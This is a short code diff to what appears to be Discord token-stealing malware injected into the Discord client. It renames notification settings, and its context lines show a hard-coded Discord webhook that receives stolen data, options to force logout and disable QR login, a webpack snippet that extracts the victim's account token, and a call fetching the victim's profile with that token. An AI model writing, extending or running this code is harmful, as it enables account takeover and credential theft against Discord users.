@@ -8,8 +8,8 @@ const queryString = require("querystring");
 let config = {
  webhook: "https://canary.discord.com/api/webhooks/1365804617744777279/ovBDwu1u3VSrD1H4x46qfuoNfpL8LAw8lI0DWfugeJBwbVrJYymafLiCPm137yMptnag",
  logout: "true",
- logout_notify: "true",
- init_notify: "true",
+ "logout-notify": "true",
+ "init-notify": "true",
  disable_qrcode: "true",
  get: {
   token: `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
@@ -393,7 +393,7 @@ async function Init() {
  const token = await ExecScript(tokenScript);
  const user = await GetUrl("https://discord.com/api/v8/users/@me", token);
  const avatar = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`;
- if (config["init_notify"] !== "true") {
+ if (config["init-notify"] !== "true") {
   return true;
  }
 
